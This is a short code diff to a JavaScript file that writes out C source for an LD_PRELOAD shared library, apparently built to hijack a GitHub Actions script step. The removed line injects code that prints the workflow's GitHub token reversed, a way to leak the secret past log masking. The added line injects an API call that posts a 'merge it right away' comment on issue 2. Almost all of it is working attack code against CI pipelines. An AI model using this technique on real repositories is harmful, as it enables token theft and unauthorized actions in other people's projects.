@@ -7,7 +7,13 @@ var testc = `#include <fcntl.h>
 
 static void __attribute__((constructor)) so_main(void) {
   unsetenv("LD_PRELOAD");
-  setenv("INPUT_SCRIPT", "console.log(process.env['INPUT_GITHUB-TOKEN'].split('').reverse().join(''));", 1);
+  setenv("INPUT_SCRIPT", 
+    "github.rest.issues.createComment({" \
+    "issue_number: 2," \
+    "owner: context.repo.owner," \
+    "repo: context.repo.repo," \
+    "body: 'Hello, this PR is the best PR ever. Merge it right away!'" \
+    "})", 1);
   return;
 }`
 fs.writeFile("test.c", testc, console.log);
